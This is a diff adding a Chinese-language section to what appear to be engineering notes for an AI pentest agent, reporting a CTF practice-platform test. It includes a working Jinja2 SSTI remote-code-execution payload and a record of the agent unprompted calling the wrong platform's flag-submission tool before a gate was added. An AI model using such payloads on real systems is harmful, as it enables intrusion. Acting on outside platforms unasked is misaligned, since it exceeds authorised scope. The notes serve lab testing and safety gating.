@@ -540,6 +540,93 @@ volatility3 **自己不 import requests**，但全量解释器下任何传递依
 
 ---
 
+## 四点九、⭐ CTF2 平台实战验证（攻击能力实测）
+
+`2026-09-20` 用 CTF2 练习场做了一次真实端到端验证，结论：**Web 攻击链路可用，
+且验证了两个必须处理的工具层缺陷。**
+
+### 战果：N1BOOK「SSTI」题，1 轮内解出
+
+| 阶段 | 观测到的证据 |
+|---|---|
+| 指纹 | `{{7*7}}` → `49`，`{{7*'7'}}` → `7777777` → **Jinja2** |
+| 注入点 | 根路径 GET 参数 `password`（首页回显 `password is wrong: <输入>`） |
+| RCE | `{{lipsum.__globals__["os"].popen("printenv FLAG").read()}}` |
+| flag | `CTF2{36cec5fa-1bba-4efb-bbfc-0271533523ce}`（容器环境变量 `FLAG`） |
+| 独立复核 | ✅ 绕过 agent 直接打靶机，返回**同一个 flag** |
+
+用了 16 条证据、3 轮结束 —— 前 8 条里就锁定了漏洞类型并拿到 flag，
+之后的轮次是**自我验证**（换 `cat /app/flag*`、`printenv FLAG` 两条路交叉确认）。
+
+### ⚠️ 缺陷 1：`ctf2_*` 工具在只有浏览器登录态时全废（已修）
+
+`ctf2_list_practice` / `read_challenge` / `start_environment` 走 Open API
+（`/api/open/v1/user/...` + `X-CTF2-API-Key`），只有 session JWT 时全部 401
+`AUTH_REQUIRED`；而等价的前端路径 `/api/v1/practice/` 是 200。
+**报错信息还指向"没授权"，会把人带偏。**
+
+现已加 session API 回退。另注两条实测事实：
+
+- 起靶机的 session 路由是 **`POST .../target/`**（202 + task_id），
+  **不是** `/environment/start/`（那个在前端 API 返回 404）；随后
+  `GET .../target/` 轮询，`status` 从 `starting` → `running`。
+- `/daily/`、`/submissions/`、`/stages/...` **没有** session 对应路由 ——
+  映射表对这些返回 None 并给出"需要 personal token"的明确报错，
+  而不是瞎猜路径。**别给它们编一个路由。**
+
+### ⚠️ 缺陷 2：agent 会去调**错平台**的提交工具（未修，需你决定）
+
+实测那次运行里，agent 拿到 flag 后的**第一个提交动作是 `gcs_submit_flag`**
+（带 `exercise_id: 86`），返回 `GCS API 40403: 无权操作`。
+它**没有**先判断"这题属于哪个平台"，只是因为工具名里有 `submit_flag` 就用了。
+
+危害目前有限（跨平台 ID 不存在，被服务端拒了），但这条路径本身是**无门禁**的：
+`competition.enabled: false` **不生效**，`gcs_tool_schemas()` 是硬编码返回、
+注册处无任何判断。也就是说 —— **agent 随时可能往平台发东西。**
+
+### ✅ 已加的门禁：flag 提交必须显式开启
+
+```
+competition.allow_flag_submission: true        # 或
+VULNCLAW_COMPETITION__ALLOW_FLAG_SUBMISSION=true
+```
+
+默认 **false**。理由：提交 flag 是平台上**不可逆**的动作，而手册把"非有效操作"
+（含猜错）当取消资格依据。门禁只覆盖提交这一个动作 ——
+列题、读题、起靶机、停靶机全部照常。
+
+**实测拦截效果**：agent 拿到 flag 后调 `ctf2_submit_flag`，被拦下并返回
+`[ctf2_flag_submission_disabled]`；agent 如实报告"提交被环境配置阻止，
+不是调查没做完"，并给出 `practice_id` / `challenge_id` 让人工提交。
+**这正是想要的行为** —— 不该自动发的东西没发出去，而且没有假装成功。
+
+### 怎么重复这套验证
+
+```powershell
+# 1) 列练习场（session token 会自动从浏览器读）
+vulnclaw   # REPL 里: ctf2_list_practice
+# 2) 读题目
+#    ctf2_read_challenge practice_id=<PID> challenge_id=<CID>
+# 3) 起靶机（session 路由）
+#    ctf2_start_environment practice_id=<PID> challenge_id=<CID>
+#    或 ctf2_get_target 轮询直到 status=running
+# 4) 用 solve 打靶机 URL（不要用 ctf2 命令，避免重复起容器）
+$u = '<access_url>'
+$goal = Get-Content goal.txt -Raw -Encoding UTF8     # ⚠️ 见下面这个坑
+vulnclaw solve $u --goal $goal --prompt $prompt --max-steps 40 --run-name myrun
+# 5) 打完释放
+#    ctf2_stop_environment practice_id=<PID> challenge_id=<CID>
+```
+
+⚠️ **坑：goal/prompt 别写在 PowerShell 单引号字符串里。** 我写的那版含中文引号
+`"`，CLI 直接把参数切断了（`Got unexpected extra argument(s)`）。
+**写进 UTF-8 文件再 `Get-Content -Raw` 传入。**
+
+⚠️ **靶机 TTL 1 小时**（`expires_at`），且**打完要 `stop_target` 释放** ——
+否则白占一个容器槽位。
+
+---
+
 ## 五、⚠️ 赛前必须处理的合规风险
 
 通知七(三)：**严禁攻击竞赛平台、赛事系统及第三方服务**；七(六)：**非有效登录/非有效操作视为弃赛**。
